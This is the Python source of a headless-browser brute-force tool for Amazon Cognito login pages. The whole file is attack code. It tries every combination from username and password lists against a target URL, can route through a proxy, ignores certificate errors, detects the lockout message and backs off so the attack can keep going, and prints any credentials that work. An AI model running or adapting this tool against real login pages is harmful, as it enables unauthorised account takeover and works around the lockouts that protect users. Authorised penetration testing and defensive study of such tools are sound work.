import argparse
from collections import deque, defaultdict
from itertools import product
from random import shuffle
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def setup_driver(proxy_address=None):
    chrome_options = Options()
    if proxy_address:
        chrome_options.add_argument(f'--proxy-server={proxy_address}')
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument("--window-size=1920x1080")
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def shuffle_attempts(email_list, password_list):
    attempts = list(product(email_list, password_list))
    shuffle(attempts)
    return deque(attempts)

def attempt_login(base_url, email_list_file, password_list_file, proxy_address=None):
    driver = setup_driver(proxy_address)
    initial_delay = 180000  # 3 minutes in milliseconds
    attempts_queue = deque()
    consecutive_failures = defaultdict(int)

    with open(email_list_file, 'r') as emails_file, open(password_list_file, 'r') as passwords_file:
        email_list = emails_file.read().splitlines()
        password_list = passwords_file.read().splitlines()
        attempts_queue = shuffle_attempts(email_list, password_list)

    while attempts_queue:
        email, password = attempts_queue.popleft()
        delay = initial_delay  # Initialize delay for this attempt

        driver.get(base_url)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        driver.execute_script(f'document.querySelector("#signInFormUsername").value="{email}";')
        driver.execute_script(f'document.querySelector("#signInFormPassword").value="{password}";')
        driver.execute_script('document.querySelector("input[name=\'signInSubmitButton\']").click();')
        time.sleep(2)  # Processing time for server response

        try:
            error_message = driver.find_element(By.ID, "loginErrorMessage").text
            if "Password attempts exceeded" in error_message:
                consecutive_failures[email] += 1
                delay = initial_delay * consecutive_failures[email]
                attempts_queue.append((email, password))  # Requeue for retry
            else:
                print(f"Login failed for {email} with password {password}: {error_message}")
        except NoSuchElementException:
            if "dashboard" in driver.current_url:
                print(f"Login success for {email} with password {password}")
                consecutive_failures[email] = 0  # Reset on success
                continue
            else:
                print(f"Login unclear for {email} with password {password}: Check manually")
                consecutive_failures[email] = 0  # Reset on unclear outcome
                continue

        print(f"Estimated time remaining: {len(attempts_queue) * (delay / 60000):.2f} minutes")
        print(f"Sleeping for {delay / 1000:.1f} seconds (lockout)")
        time.sleep(delay / 1000)

    driver.quit()

def main():
    parser = argparse.ArgumentParser(description='Amazon Cognito Bruteforce Tool\nhttps://github.com/root4loot/cognito-brute-force', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('url', help='Base URL for login')
    parser.add_argument('username_file', help='File containing usernames')
    parser.add_argument('password_file', help='File containing passwords')
    parser.add_argument('--proxy', help='Proxy address (optional)', default=None)
    args = parser.parse_args()
    attempt_login(args.url, args.username_file, args.password_file, args.proxy)

if __name__ == "__main__":
    main()
